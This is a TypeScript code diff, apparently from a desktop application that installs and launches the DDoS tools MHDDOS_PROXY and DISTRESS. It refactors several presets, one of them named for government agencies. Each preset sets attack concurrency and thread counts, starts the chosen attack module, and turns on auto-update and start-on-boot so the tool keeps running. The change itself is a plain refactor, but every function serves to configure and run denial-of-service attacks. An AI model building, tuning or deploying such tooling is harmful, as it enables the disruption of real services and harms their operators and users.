@@ -17,7 +17,7 @@ function selectRandomModuleWithWeight (): ModuleName {
     { name: 'DISTRESS' as ModuleName, weight: 2 }
   ]
 
-  if (!Platform.is.mac) { // MHDDOS_PROXY only for Windows and Linux
+  if (Platform.is.win || Platform.is.linux) {
     modules.push({ name: 'MHDDOS_PROXY' as ModuleName, weight: 2 })
   }
 
@@ -35,9 +35,7 @@ function selectRandomModuleWithWeight (): ModuleName {
   return 'DISTRESS'
 }
 
-async function installModule (mhddosProxyConfig:MHDDOSProxyConfig, distressConfig: DistressConfig, callback: (progress: InstallProgress) => void) {
-  const moduleName: ModuleName = selectRandomModuleWithWeight()
-
+async function installModule (moduleName: ModuleName, mhddosProxyConfig: MHDDOSProxyConfig, distressConfig: DistressConfig, callback: (progress: InstallProgress) => void) {
   const versions = await window.modulesAPI.getAllVersions(moduleName)
   const tag = versions[0].tag
   await window.modulesAPI.installVersion(moduleName, tag, callback)
@@ -52,8 +50,6 @@ async function installModule (mhddosProxyConfig:MHDDOSProxyConfig, distressConfi
       await window.modulesAPI.setConfig(moduleName, distressConfig)
       break
   }
-
-  await window.executionEngineAPI.setModuleToRun(moduleName)
 }
 
 async function getDefaultConfigs () {
@@ -72,12 +68,12 @@ export async function configureGovernmentAgencyPreset (callback: (progress: Inst
   const { mhddosProxyConfig, distressConfig } = await getDefaultConfigs()
 
   distressConfig.concurrency = 212
-
   mhddosProxyConfig.copies = 1
   mhddosProxyConfig.threads = 160
 
-  await installModule(mhddosProxyConfig, distressConfig, callback)
-
+  const moduleName = selectRandomModuleWithWeight()
+  await installModule(moduleName, mhddosProxyConfig, distressConfig, callback)
+  await window.executionEngineAPI.setModuleToRun(moduleName)
   await window.executionEngineAPI.startModule()
   await window.settingsAPI.system.setAutoUpdate(true)
   await window.settingsAPI.system.setStartOnBoot(true)
@@ -91,7 +87,9 @@ export async function configureLaptopPreset (callback: (progress: InstallProgres
   mhddosProxyConfig.copies = 1
   mhddosProxyConfig.threads = 1024
 
-  await installModule(mhddosProxyConfig, distressConfig, callback)
+  const moduleName = selectRandomModuleWithWeight()
+  await installModule(moduleName, mhddosProxyConfig, distressConfig, callback)
+  await window.executionEngineAPI.setModuleToRun(moduleName)
   await window.executionEngineAPI.startModule()
   await window.settingsAPI.system.setAutoUpdate(true)
   await window.settingsAPI.system.setStartOnBoot(true)
@@ -105,7 +103,9 @@ export async function configureComfortPreset (callback: (progress: InstallProgre
   mhddosProxyConfig.copies = 1
   mhddosProxyConfig.threads = 1280
 
-  await installModule(mhddosProxyConfig, distressConfig, callback)
+  const moduleName = selectRandomModuleWithWeight()
+  await installModule(moduleName, mhddosProxyConfig, distressConfig, callback)
+  await window.executionEngineAPI.setModuleToRun(moduleName)
   await window.executionEngineAPI.startModule()
   await window.settingsAPI.system.setAutoUpdate(true)
   await window.settingsAPI.system.setStartOnBoot(true)
@@ -114,7 +114,10 @@ export async function configureComfortPreset (callback: (progress: InstallProgre
 
 export async function configureNormalPreset (callback: (progress: InstallProgress) => void) {
   const { mhddosProxyConfig, distressConfig } = await getDefaultConfigs()
-  await installModule(mhddosProxyConfig, distressConfig, callback)
+
+  const moduleName = selectRandomModuleWithWeight()
+  await installModule(moduleName, mhddosProxyConfig, distressConfig, callback)
+  await window.executionEngineAPI.setModuleToRun(moduleName)
   await window.executionEngineAPI.startModule()
   await window.settingsAPI.system.setAutoUpdate(true)
   await window.settingsAPI.system.setStartOnBoot(true)
@@ -125,11 +128,12 @@ export async function configureMaxPreset (callback: (progress: InstallProgress) 
   const { mhddosProxyConfig, distressConfig } = await getDefaultConfigs()
 
   distressConfig.concurrency = 65534
+  mhddosProxyConfig.copies = 0
+  mhddosProxyConfig.threads = 0
 
-  mhddosProxyConfig.copies = 0 // Auto
-  mhddosProxyConfig.threads = 0 // Auto
-
-  await installModule(mhddosProxyConfig, distressConfig, callback)
+  const moduleName = selectRandomModuleWithWeight()
+  await installModule(moduleName, mhddosProxyConfig, distressConfig, callback)
+  await window.executionEngineAPI.setModuleToRun(moduleName)
   await window.executionEngineAPI.startModule()
   await window.settingsAPI.system.setAutoUpdate(true)
   await window.settingsAPI.system.setStartOnBoot(true)
